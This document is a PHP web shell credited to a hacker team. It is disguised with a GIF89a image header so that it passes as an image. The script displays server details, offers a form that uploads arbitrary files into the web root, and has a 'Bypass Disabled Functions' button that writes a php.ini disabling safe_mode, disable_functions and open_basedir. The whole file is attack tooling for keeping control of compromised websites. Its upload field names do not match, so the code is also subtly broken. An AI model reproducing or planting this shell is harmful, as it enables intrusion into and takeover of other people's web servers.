#################################################
#           reCoded by: Jakarta6etar            #
#          Team: Eldersc0de Securi7y            #
#         https://fb.com/jakarta.exploded.12    #
#-----------------------------------------------#
#    Thank's To IndoXploit and Xai Syndicate    #
#################################################

GIF89a;
<html>
<body bgcolor="white">
  <font color="green">
<?php 
echo "<center>";
echo "<br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>

 <input type='file' name='ins0m'>

 <input type='submit' name='upload' value='upload'>

 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['elders']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) {
    if(is_writable($root)) {

 if(@copy($_FILES['elders']['tmp_name'], $dest)) {

 $web = "http://".$_SERVER['HTTP_HOST']."/";

 echo "Success Uploaded-> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

 }

 else {             echo "Unable To Upload File";

 }

 }

 else {         if(@copy($_FILES['elders']['tmp_name'], $files))

 {

     echo "Upload Success <b>$files</b>";

     }

     else {             echo "Unable To Upload File";

     }

     }

     }
echo "<br>";
#######################
#Thank's to IndoXploit#
#######################
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<br>";
echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
echo "<form method='post'>
<input type='submit' name='funct' value='Bypass Disabled Functions'>
</form>";
if($_POST['funct']) {
$file = 'php.ini';
file_put_contents($file,'safe_mode = OFF
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF');
echo "<font color='green'>Success Bypassing Disable Func.</font>";
}
?>
